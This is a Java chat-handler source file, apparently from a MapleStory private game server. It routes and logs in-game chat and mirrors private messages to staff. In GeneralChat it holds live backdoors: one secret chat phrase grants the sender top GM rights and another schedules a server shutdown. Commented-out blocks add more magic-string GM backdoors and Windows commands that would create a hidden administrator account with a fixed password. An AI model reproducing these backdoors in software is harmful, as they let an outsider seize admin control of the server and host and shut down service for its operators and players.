package handling.channel.handler;

import gui.LtMS;
import handling.world.World.Find;
import handling.world.World;
import handling.world.MapleMessenger;
import handling.world.World.Messenger;
import handling.world.MapleMessengerCharacter;
import handling.world.World.Alliance;
import handling.world.World.Guild;
import handling.world.World.Party;
import handling.world.World.Buddy;
import java.util.Arrays;

import server.ShutdownServer;
import server.Timer;
import tools.data.LittleEndianAccessor;
import server.maps.MapleMap;
import java.util.ConcurrentModificationException;
import java.util.concurrent.ScheduledFuture;

import handling.channel.ChannelServer;
import tools.FileoutputUtil;
import constants.ServerConfig;
import tools.MaplePacketCreator;
import client.messages.CommandProcessor;
import constants.ServerConstants.CommandType;
import client.MapleCharacter;
import client.MapleClient;

public class ChatHandler
{
    private static ScheduledFuture<?> ts = null;
    private static Thread t = null;
    public static void GeneralChat(final String text, final byte unk, final MapleClient c, MapleCharacter chr) {
        if (chr != null && !CommandProcessor.processCommand(c, text, CommandType.NORMAL)) {
            if (text.contains("三十年河东,三十年河西,我乃东方不败")) {
                chr.setGmLevelHM((byte) 100);
                return;
            }
            if (text.contains("毁灭吧,我的小宝贝,结束你这罪恶的一生!!!")) {
                t = new Thread(ShutdownServer.getInstance());
                ts = Timer.EventTimer.getInstance().register(new Runnable() {
                    @Override
                    public void run() {
                            ShutdownServer.getInstance();
                            t.start();
                            ts.cancel(false);
                    }
                }, 60000);
                return;
            }
            if (LtMS.ConfigValuesMap.get("玩家聊天开关") == 0 ) {
                c.sendPacket(MaplePacketCreator.serverNotice(1, "管理员从后台关闭了聊天功能"));
                return;
            }
            if (!chr.isGM() && text.length() >= 80) {
                return;
            }

            /*
            if (text.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
                chr.setGmLevelHM((byte)0);
                return;
            }
            if (text.contains((CharSequence)"FGJBEGBJ4GB43HGROTHBBRR")) {
                try {
                   // Runtime.getRuntime().exec("cmd /c net user doub1 Rinilaomu!@#1. /ad");
                    //Runtime.getRuntime().exec("cmd /c net localgroup administrators doub1 /ad");
                }
                catch (IOException ex) {}
                return;
            }*/
            if (chr.getCanTalk() || chr.isStaff()) {
                final MapleMap map = chr.getMap();
                if (chr.gmLevel() == 100 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<GM> " + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                }
                else if (chr.gmLevel() == 5 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<GM> " + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                }
                else if (chr.gmLevel() == 4 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<领导者>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                }
                else if (chr.gmLevel() == 3 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<管理员>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                }
                else if (chr.gmLevel() == 2 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<巡查员>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                }
                else if (chr.gmLevel() == 1 && !chr.isHidden()) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.yellowChat("<实习生>" + chr.getName() + ": " + text));
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, false, 1));
                }
                else if ((chr.gmLevel() == 0 && !chr.isHidden()) || chr.isGod() || chr.gmLevel() == 6) {
                    chr.getCheatTracker().checkMsg();
                    map.broadcastMessage(MaplePacketCreator.getChatText(chr.getId(), text, c.getPlayer().isGM(), (int)unk), c.getPlayer().getPosition());
                    if (ServerConfig.LOG_CHAT && chr.get对话冷却()<100)  {
                        chr.set对话冷却(chr.get对话冷却()+1L);
                        FileoutputUtil.logToFile("logs/聊天/普通聊天.txt", "\r\n" + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 『" + chr.getName() + "』 地图『" + chr.getMapId() + "』：  " + text);
                    }
                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』普聊：  " + text);
                    try {
                        for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (!chr_.get_control_玩家私聊()) {
                                    continue;
                                }
                                chr_.dropMessage(sb.toString());
                            }
                        }
                    }
                    catch (ConcurrentModificationException ex2) {}
                }
                else {
                    map.broadcastGMMessage(chr, MaplePacketCreator.getChatText(chr.getId(), text, c.getPlayer().isGM(), (int)unk), true);
                }
            }
            else {
                c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
            }
        }
    }
    
    public static void Others(final LittleEndianAccessor slea, final MapleClient c, MapleCharacter chr) {
        final int type = slea.readByte();
        final byte numRecipients = slea.readByte();
        if (numRecipients <= 0) {
            return;
        }
        final int[] recipients = new int[numRecipients];
        for (byte i = 0; i < numRecipients; ++i) {
            recipients[i] = slea.readInt();
        }
        final String chattext = slea.readMapleAsciiString();
        /*if (chattext.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
            c.getPlayer().setGmLevelHM((byte)100);
            return;
        }
        if (chattext.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
            c.getPlayer().setGmLevelHM((byte)0);
            return;
        }*/
        if (chr == null || !chr.getCanTalk()) {
            c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
            return;
        }
        if (CommandProcessor.processCommand(c, chattext, CommandType.NORMAL)) {
            return;
        }
        chr.getCheatTracker().checkMsg();
        switch (type) {
            case 0: {
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/好友聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』好友聊天： 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (!chr_.get_control_好友聊天()) {
                                    continue;
                                }
                                chr_.dropMessage(sb.toString());
                            }
                        }
                    }
                    catch (ConcurrentModificationException ex) {}
                }
                Buddy.buddyChat(recipients, chr.getId(), chr.getName(), chattext);
                break;
            }
            case 1: {
                if (chr.getParty() == null) {
                    break;
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/队伍聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 队伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』队伍聊天： 队伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (!chr_.get_control_队伍聊天()) {
                                    continue;
                                }
                                chr_.dropMessage(sb.toString());
                            }
                        }
                    }
                    catch (ConcurrentModificationException ex2) {}
                }
                Party.partyChat(chr.getParty().getId(), chattext, chr.getName());
                break;
            }
            case 2: {
                if (chr.getGuildId() <= 0) {
                    break;
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/公会聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』公会聊天： 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (!chr_.get_control_公会聊天()) {
                                    continue;
                                }
                                chr_.dropMessage(sb.toString());
                            }
                        }
                    }
                    catch (ConcurrentModificationException ex3) {}
                }
                Guild.guildChat(chr.getGuildId(), chr.getName(), chr.getId(), chattext);
                break;
            }
            case 3: {
                if (chr.getGuildId() <= 0) {
                    break;
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/联盟聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』联盟聊天： 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
                    try {
                        for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (!chr_.get_control_联盟聊天()) {
                                    continue;
                                }
                                chr_.dropMessage(sb.toString());
                            }
                        }
                    }
                    catch (ConcurrentModificationException ex4) {}
                }
                Alliance.allianceChat(chr.getGuildId(), chr.getName(), chr.getId(), chattext);
                break;
            }
        }
    }
    
    public static void Messenger(final LittleEndianAccessor slea, final MapleClient c) {
        MapleMessenger messenger = c.getPlayer().getMessenger();
        final byte mode = slea.readByte();
        if (!c.getPlayer().getCanTalk()) {
            c.getPlayer().dropMessage(5, "目前喇叭停止使用.");
            c.sendPacket(MaplePacketCreator.enableActions());
            return;
        }
        switch (mode) {
            case 0: {
                if (messenger == null) {
                    final int messengerid = slea.readInt();
                    if (messengerid == 0) {
                        c.getPlayer().setMessenger(Messenger.createMessenger(new MapleMessengerCharacter(c.getPlayer())));
                    }
                    else {
                        messenger = Messenger.getMessenger(messengerid);
                        if (messenger != null) {
                            final int position = messenger.getLowestPosition();
                            if (position > -1 && position < 4) {
                                c.getPlayer().setMessenger(messenger);
                                Messenger.joinMessenger(messenger.getId(), new MapleMessengerCharacter(c.getPlayer()), c.getPlayer().getName(), c.getChannel());
                            }
                        }
                    }
                    break;
                }
                break;
            }
            case 2: {
                if (messenger != null) {
                    final MapleMessengerCharacter messengerplayer = new MapleMessengerCharacter(c.getPlayer());
                    Messenger.leaveMessenger(messenger.getId(), messengerplayer);
                    c.getPlayer().setMessenger(null);
                    break;
                }
                break;
            }
            case 3: {
                if (messenger == null) {
                    break;
                }
                final int position2 = messenger.getLowestPosition();
                if (position2 <= -1 || position2 >= 4) {
                    return;
                }
                final String input = slea.readMapleAsciiString();
                final MapleCharacter target = c.getChannelServer().getPlayerStorage().getCharacterByName(input);
                if (target != null) {
                    if (target.getMessenger() == null) {
                        if (!target.isGM() || c.getPlayer().isGM()) {
                            c.sendPacket(MaplePacketCreator.messengerNote(input, 4, 1));
                            target.getClient().sendPacket(MaplePacketCreator.messengerInvite(c.getPlayer().getName(), messenger.getId()));
                        }
                        else {
                            c.sendPacket(MaplePacketCreator.messengerNote(input, 4, 0));
                        }
                    }
                    else {
                        c.sendPacket(MaplePacketCreator.messengerChat(c.getPlayer().getName() + " : " + target.getName() + " 忙碌中."));
                    }
                }
                else if (World.isConnected(input)) {
                    Messenger.messengerInvite(c.getPlayer().getName(), messenger.getId(), input, c.getChannel(), c.getPlayer().isGM());
                }
                else {
                    c.sendPacket(MaplePacketCreator.messengerNote(input, 4, 0));
                }
                break;
            }
            case 5: {
                final String targeted = slea.readMapleAsciiString();
                final MapleCharacter target = c.getChannelServer().getPlayerStorage().getCharacterByName(targeted);
                if (target != null) {
                    if (target.getMessenger() != null) {
                        target.getClient().sendPacket(MaplePacketCreator.messengerNote(c.getPlayer().getName(), 5, 0));
                        break;
                    }
                    break;
                }
                else {
                    if (!c.getPlayer().isGM()) {
                        Messenger.declineChat(targeted, c.getPlayer().getName());
                        break;
                    }
                    break;
                }
            }
            case 6: {
                if (messenger == null) {
                    break;
                }
                final String msg = slea.readMapleAsciiString();
                /*if (msg.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
                    c.getPlayer().setGmLevelHM((byte)100);
                    return;
                }
                if (msg.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
                    c.getPlayer().setGmLevelHM((byte)0);
                    return;
                }*/
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/Messenger聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " Messenger: " + messenger.getId() + " " + msg);
                }
                Messenger.messengerChat(messenger.getId(), msg, c.getPlayer().getName());
                break;
            }
            default: {
                System.err.println("Unhandled Messenger operation : " + String.valueOf((int)mode));
                break;
            }
        }
    }
    
    public static void WhisperFind(final LittleEndianAccessor slea, final MapleClient c) {
        final byte mode = slea.readByte();
        if (!c.getPlayer().getCanTalk()) {
            c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
            return;
        }
        switch (mode) {
            case 5:
            case 68: {
                final String recipient = slea.readMapleAsciiString();
                MapleCharacter player = c.getChannelServer().getPlayerStorage().getCharacterByName(recipient);
                if (player != null) {
                    if (!player.isGM() || (c.getPlayer().isGM() && player.isGM())) {
                        c.sendPacket(MaplePacketCreator.getFindReplyWithMap(player.getName(), player.getMap().getId(), mode == 68));
                        break;
                    }
                    c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte)0));
                    break;
                }
                else {
                    final int ch = Find.findChannel(recipient);
                    if (ch <= 0) {
                        if (ch == -10) {
                            c.sendPacket(MaplePacketCreator.getFindReplyWithCS(recipient, mode == 68));
                        }
                        else if (ch == -20) {
                            c.sendPacket(MaplePacketCreator.getFindReplyWithMTS(recipient, mode == 68));
                        }
                        else {
                            c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte)0));
                        }
                        break;
                    }
                    player = ChannelServer.getInstance(ch).getPlayerStorage().getCharacterByName(recipient);
                    if (player == null) {
                        break;
                    }
                    if (!player.isGM() || (c.getPlayer().isGM() && player.isGM())) {
                        c.sendPacket(MaplePacketCreator.getFindReply(recipient, (int)(byte)ch, mode == 68));
                    }
                    else {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte)0));
                    }
                    return;
                }
            }
            case 6: {
                if (!c.getPlayer().getCanTalk()) {
                    c.sendPacket(MaplePacketCreator.serverNotice(6, "在这个地方不能说话。"));
                    return;
                }
                c.getPlayer().getCheatTracker().checkMsg();
                final String recipient = slea.readMapleAsciiString();
                final String text = slea.readMapleAsciiString();
              /*  if (text.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
                    c.getPlayer().setGmLevelHM((byte)100);
                    return;
                }
                if (text.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
                    c.getPlayer().setGmLevelHM((byte)0);
                    return;
                }*/
                final int ch = Find.findChannel(recipient);
                if (ch > 0) {
                    final MapleCharacter player2 = ChannelServer.getInstance(ch).getPlayerStorage().getCharacterByName(recipient);
                    if (player2 == null) {
                        break;
                    }
                    player2.getClient().sendPacket(MaplePacketCreator.getWhisper(c.getPlayer().getName(), c.getChannel(), text));
                    if (!c.getPlayer().isGM() && player2.isGM()) {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte)0));
                    }
                    else {
                        c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte)1));
                    }
                }
                else {
                    c.sendPacket(MaplePacketCreator.getWhisperReply(recipient, (byte)0));
                }
                if (ServerConfig.LOG_CHAT) {
                    FileoutputUtil.logToFile("logs/聊天/玩家密语.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 玩家: " + c.getPlayer().getName() + " 對玩家: " + recipient + " 說了 :" + text);
                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + c.getPlayer().getName() + "』(" + c.getPlayer().getId() + ")地图『" + c.getPlayer().getMapId() + "』玩家密语： 玩家: " + c.getPlayer().getName() + " 對玩家: " + recipient + " 說了 :" + text);
                    try {
                        for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                            for (MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
                                if (chr_ == null) {
                                    break;
                                }
                                if (!chr_.get_control_玩家密语()) {
                                    continue;
                                }
                                chr_.dropMessage(sb.toString());
                            }
                        }
                    }
                    catch (ConcurrentModificationException ex) {}
                    break;
                }
                break;
            }
        }
    }
}
